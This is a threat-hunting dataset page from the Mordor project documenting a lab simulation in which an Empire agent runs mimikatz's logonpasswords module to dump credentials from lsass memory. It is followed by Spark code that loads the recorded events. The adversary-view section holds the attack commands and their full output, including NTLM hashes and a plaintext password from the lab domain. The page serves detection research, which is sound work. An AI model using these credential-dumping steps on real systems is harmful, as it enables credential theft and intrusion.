# Empire Mimikatz Logonpasswords

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518202151 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_logonpasswords.tar.gz |

## Dataset Description
This dataset represents adversaries using mimikatz and module `logonpasswords` to dump credentials from the memory contents of lsass.exe

## Adversary View
```
(Empire: TKV35P8X) > usemodule credentials/mimikatz/logonpasswords*
(Empire: powershell/credentials/mimikatz/logonpasswords) > info

              Name: Invoke-Mimikatz DumpCreds
            Module: powershell/credentials/mimikatz/logonpasswords
        NeedsAdmin: True
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract
  plaintext credentials from memory.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        TKV35P8X                  Agent to run module on.                 

(Empire: powershell/credentials/mimikatz/logonpasswords) > execute
[*] Tasked TKV35P8X to run TASK_CMD_JOB
[*] Agent TKV35P8X tasked with task ID 17
[*] Tasked agent TKV35P8X to run module powershell/credentials/mimikatz/logonpasswords
(Empire: powershell/credentials/mimikatz/logonpasswords) > Job started: TS8ARN
Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 789700 (00000000:000c0cc4)
Session           : Interactive from 1
User Name         : nmartha
Domain            : SHIRE
Logon Server      : HFDC01
Logon Time        : 5/14/2019 12:02:02 PM
SID               : S-1-5-21-2511471446-1103646877-3980648787-1106
  msv :	
  [00000003] Primary
  * Username : nmartha
  * Domain   : SHIRE
  * NTLM     : 65f55a917b232dc6bb8e93872e458326
  * SHA1     : 19ed298d7b3d2c58918ebc0f4670cff5a1020d9e
  * DPAPI    : e28a4a7bea1950d9558f1e3a4662302a
  tspkg :	
  wdigest :	
  * Username : nmartha
  * Domain   : SHIRE
  * Password : (null)
  kerberos :	
  * Username : nmartha
  * Domain   : SHIRE.COM
  * Password : (null)
  ssp :	
  credman :	

Authentication Id : 0 ; 789663 (00000000:000c0c9f)
Session           : Interactive from 1
User Name         : nmartha
Domain            : SHIRE
Logon Server      : HFDC01
Logon Time        : 5/14/2019 12:02:02 PM
SID               : S-1-5-21-2511471446-1103646877-3980648787-1106
  msv :	
  [00000003] Primary
  * Username : nmartha
  * Domain   : SHIRE
  * NTLM     : 65f55a917b232dc6bb8e93872e458326
  * SHA1     : 19ed298d7b3d2c58918ebc0f4670cff5a1020d9e
  * DPAPI    : e28a4a7bea1950d9558f1e3a4662302a
  tspkg :	
  wdigest :	
  * Username : nmartha
  * Domain   : SHIRE
  * Password : (null)
  kerberos :	
  * Username : nmartha
  * Domain   : SHIRE.COM
  * Password : (null)
  ssp :	
  [00000000]
  * Username : pgustavo
  * Domain   : shire
  * Password : W1n1!19
  credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:44 AM
SID               : S-1-5-19
  msv :	
  tspkg :	
  wdigest :	
  * Username : (null)
  * Domain   : (null)
  * Password : (null)
  kerberos :	
  * Username : (null)
  * Domain   : (null)
  * Password : (null)
  ssp :	
  credman :	

Authentication Id : 0 ; 63941 (00000000:0000f9c5)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:43 AM
SID               : S-1-5-90-0-1
  msv :	
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :	
  wdigest :	
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :	
  * Username : HR001$
  * Domain   : shire.com
  * Password : u5@ORs;+(&[JsT@`r"_.W/y&:$>QTXx!\xN_$ppX8vj<35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&fa>mpm[FP$+toFL?`pWRygP8j
  ssp :	
  credman :	

Authentication Id : 0 ; 62725 (00000000:0000f505)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:43 AM
SID               : S-1-5-90-0-1
  msv :	
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :	
  wdigest :	
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :	
  * Username : HR001$
  * Domain   : shire.com
  * Password : u5@ORs;+(&[JsT@`r"_.W/y&:$>QTXx!\xN_$ppX8vj<35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&fa>mpm[FP$+toFL?`pWRygP8j
  ssp :	
  credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : HR001$
Domain            : SHIRE
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:43 AM
SID               : S-1-5-20
  msv :	
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :	
  wdigest :	
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :	
  * Username : hr001$
  * Domain   : SHIRE.COM
  * Password : (null)
  ssp :	
  credman :	

Authentication Id : 0 ; 39974 (00000000:00009c26)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:41 AM
SID               : S-1-5-96-0-0
  msv :	
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :	
  wdigest :	
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :	
  * Username : HR001$
  * Domain   : shire.com
  * Password : u5@ORs;+(&[JsT@`r"_.W/y&:$>QTXx!\xN_$ppX8vj<35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&fa>mpm[FP$+toFL?`pWRygP8j
  ssp :	
  credman :	

Authentication Id : 0 ; 39911 (00000000:00009be7)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:41 AM
SID               : S-1-5-96-0-1
  msv :	
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :	
  wdigest :	
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :	
  * Username : HR001$
  * Domain   : shire.com
  * Password : u5@ORs;+(&[JsT@`r"_.W/y&:$>QTXx!\xN_$ppX8vj<35*wQHd[jsX4p$,aEyI3n12O EJe)Mv5?R90uf6N+PdMFV6=s`&fa>mpm[FP$+toFL?`pWRygP8j
  ssp :	
  credman :	

Authentication Id : 0 ; 37663 (00000000:0000931f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:40 AM
SID               : 
  msv :	
  [00000003] Primary
  * Username : HR001$
  * Domain   : SHIRE
  * NTLM     : 7db15a1083d24df4e5b82a0de8ba60f7
  * SHA1     : 11d7f7530035b95306ac0b9f24d29e85bed0fd13
  tspkg :	
  wdigest :	
  kerberos :	
  ssp :	
  credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : HR001$
Domain            : SHIRE
Logon Server      : (null)
Logon Time        : 5/3/2019 3:14:40 AM
SID               : S-1-5-18
  msv :	
  tspkg :	
  wdigest :	
  * Username : HR001$
  * Domain   : SHIRE
  * Password : (null)
  kerberos :	
  * Username : hr001$
  * Domain   : SHIRE.COM
  * Password : (null)
  ssp :	
  credman :	

mimikatz(powershell) # exit
Bye!
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_logonpasswords.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        